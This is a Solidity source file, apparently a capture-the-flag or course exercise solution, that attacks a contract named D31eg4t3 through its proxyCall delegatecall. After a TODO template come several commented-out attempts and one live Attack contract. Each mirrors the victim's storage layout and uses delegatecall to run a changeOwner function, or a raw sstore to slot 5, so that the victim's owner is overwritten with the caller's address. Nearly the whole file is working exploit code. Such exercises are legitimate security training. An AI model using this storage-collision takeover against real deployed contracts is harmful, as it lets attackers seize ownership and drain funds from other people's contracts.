// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ID31eg4t3 {
    function proxyCall(bytes calldata data) external returns (address);
    function changeResult() external;
}

// contract Attack {
//     address internal immutable victim;
//     // TODO: Declare some variable here
//     // Note: Checkout the storage layout in victim contract

//     constructor(address addr) payable {
//         victim = addr;
//     }

//     // NOTE: You might need some malicious function here

//     function exploit() external {
//         // TODO: Add your implementation here
//         // Note: Make sure you know how delegatecall works
//         // bytes memory data = ...
//     }
// }

// contract Attack {
//     address internal immutable victim;
//     // Storage slot alignment with D31eg4t3
//     uint256 var0;
//     uint8 var1;
//     string private var2;
//     address private var3;
//     uint8 private var4;
//     address public owner;  // Aligned with the owner in D31eg4t3

//     constructor(address addr) payable {
//         victim = addr;
//         owner = msg.sender;  // Initialize owner to attacker's address
//     }

//     // Malicious function to change ownership
//     function changeOwner() public {
//         owner = msg.sender;
//     }

//     // function exploit() external {
//     //     // The function selector for changeOwner()
//     //     bytes memory data = abi.encodeWithSelector(Attack.changeOwner.selector);

//     //     // Calling proxyCall with data that includes the malicious function selector
//     //     (bool success, ) = victim.call(abi.encodeWithSelector(bytes4(keccak256("proxyCall(bytes)")), data));
//     //     require(success, "Call failed");
//     // }
//     function exploit() external {
//         // Explicitly specifying the function signature for changeOwner
//         bytes4 selector = bytes4(keccak256("changeOwner()"));
//         bytes memory data = abi.encodeWithSelector(selector);

//         // Calling proxyCall with data that includes the malicious function selector
//         (bool success, ) = victim.call(abi.encodeWithSelector(bytes4(keccak256("proxyCall(bytes)")), data));
//         require(success, "Delegatecall failed");
//     }

// }

// contract Attack {
//     address internal immutable victim;

//     // Aligning the storage layout with D31eg4t3
//     uint256 internal var0; // Aligning with uint256 var0 in D31eg4t3
//     uint8 internal var1;   // Aligning with uint8 var1 in D31eg4t3
//     string internal var2;  // Aligning with string private var2 in D31eg4t3
//     address internal var3; // Aligning with address private var3 in D31eg4t3
//     uint8 internal var4;   // Aligning with uint8 private var4 in D31eg4t3
//     address internal owner; // This should align with address public owner in D31eg4t3

//     constructor(address addr) payable {
//         victim = addr;
//     }

//     // Malicious function to change ownership
//     // This function's code will be executed in the context of D31eg4t3 due to delegatecall
//     function changeOwner() public {
//         owner = msg.sender;
//     }

//     function exploit() external {
//         bytes4 selector = bytes4(keccak256("changeOwner()"));
//         bytes memory data = abi.encodeWithSelector(selector);

//         // Calling proxyCall with data that includes the malicious function selector
//         (bool success, ) = victim.call(abi.encodeWithSelector(bytes4(keccak256("proxyCall(bytes)")), data));
//         require(success, "Delegatecall failed");
//     }
// }

// contract Attack {
//     address internal immutable victim;
    
//     // Mimic the storage structure of D31eg4t3 exactly
//     uint256 internal var0;
//     uint8 internal var1;
//     string internal var2;
//     address internal var3;
//     uint8 internal var4;
//     address public owner; // Aligned with the owner in D31eg4t3

//     constructor(address _victim) {
//         victim = _victim;
//     }

//     // A direct storage manipulation method
//     function changeOwnerDirectly(address newOwner) public {
//         assembly {
//             // Assuming the owner is at slot 5 in D31eg4t3
//             sstore(5, newOwner)
//         }
//     }

//     function exploit() external {
//         // Construct the call to changeOwnerDirectly with the attacker's address
//         bytes memory data = abi.encodeWithSelector(this.changeOwnerDirectly.selector, msg.sender);

//         // Make the delegatecall through proxyCall
//         (bool success, ) = victim.call(abi.encodeWithSelector(bytes4(keccak256("proxyCall(bytes)")), data));
//         require(success, "Delegatecall failed");
//     }
// }

// contract Attack {
//     address internal immutable victim;

//     // Aligning storage layout with D31eg4t3
//     uint256 internal var0; // Align with uint256 var0 in D31eg4t3
//     uint8 internal var1;   // Align with uint8 var1 in D31eg4t3
//     string internal var2;  // Align with string var2 in D31eg4t3
//     address internal var3; // Align with address var3 in D31eg4t3
//     uint8 internal var4;   // Align with uint8 var4 in D31eg4t3
//     // The owner should be in the next slot if no other variables are between var4 and owner in D31eg4t3

//     constructor(address _victim) {
//         victim = _victim;
//     }

//     function changeOwnerDirectly(address newOwner) public {
//         assembly {
//             // Assuming owner is at the 6th slot (index 5), adjust if necessary based on actual layout
//             sstore(5, newOwner)
//         }
//     }

//     function exploit() external {
//         bytes4 selector = bytes4(keccak256("changeOwnerDirectly(address)"));
//         bytes memory data = abi.encodeWithSelector(selector, msg.sender);

//         (bool success, ) = victim.call(abi.encodeWithSelector(bytes4(keccak256("proxyCall(bytes)")), data));
//         require(success, "Delegatecall failed");
//     }
// }

// contract Attack {
//     address internal immutable victim;

//     // Aligning storage layout with D31eg4t3
//     uint256 internal var0; // Align with uint256 var0 in D31eg4t3
//     uint8 internal var1;   // Align with uint8 var1 in D31eg4t3
//     string internal var2;  // Align with string var2 in D31eg4t3
//     address internal var3; // Align with address var3 in D31eg4t3
//     uint8 internal var4;   // Align with uint8 var4 in D31eg4t3
//     address public owner;  // Align with address public owner in D31eg4t3

//     constructor(address _victim) {
//         victim = _victim;
//         owner = address(0); // Initialize to a default value
//     }

//     // This function should match the signature and storage position in D31eg4t3
//     function changeOwner() public {
//         owner = msg.sender; // This should update the owner in D31eg4t3 due to delegatecall
//     }

//     function exploit() external {
//         bytes4 selector = bytes4(keccak256("changeOwner()"));
//         bytes memory data = abi.encodeWithSelector(selector);

//         (bool success, ) = victim.call(abi.encodeWithSelector(bytes4(keccak256("proxyCall(bytes)")), data));
//         require(success, "Delegatecall failed");
//     }
// }

// contract Attack {
//     // Storage variables must align with those in D31eg4t3.
//     uint256 internal var0;  // Align with uint256 var0 in D31eg4t3
//     uint8 internal var1;    // Align with uint8 var1 in D31eg4t3
//     string internal var2;   // Align with string var2 in D31eg4t3
//     address internal var3;  // Align with address var3 in D31eg4t3
//     uint8 internal var4;    // Align with uint8 var4 in D31eg4t3
//     address public owner;   // Align with address public owner in D31eg4t3

//     address internal victim;

//     constructor(address _victim) {
//         victim = _victim;
//     }

//     // This function is intended to be executed via delegatecall.
//     function changeOwner() public {
//         owner = msg.sender;
//     }

//     function exploit() external {
//         bytes memory data = abi.encodeWithSelector(this.changeOwner.selector);
//         (bool success, ) = victim.call(abi.encodeWithSelector(bytes4(keccak256("proxyCall(bytes)")), data));
//         require(success, "Delegatecall failed");
//     }
// }

contract Attack {
    // The address of the D31eg4t3 contract
    address internal immutable victim;

    // Storage layout must align with D31eg4t3
    uint256 internal var0;
    uint8 internal var1;
    string internal var2;
    address internal var3;
    uint8 internal var4;
    address public owner;

    constructor(address _victim) {
        victim = _victim;
    }

    // Function to change owner - mimics a potential function in D31eg4t3
    function changeOwner() public {
        owner = msg.sender;
    }

    // Function to initiate the exploit
    function exploit() external {
        // Encoding the call to changeOwner
        bytes memory data = abi.encodeWithSelector(this.changeOwner.selector);
        
        // Triggering the delegatecall via proxyCall in D31eg4t3
        (bool success, ) = victim.call(abi.encodeWithSelector(bytes4(keccak256("proxyCall(bytes)")), data));
        require(success, "Delegatecall failed");
    }
}





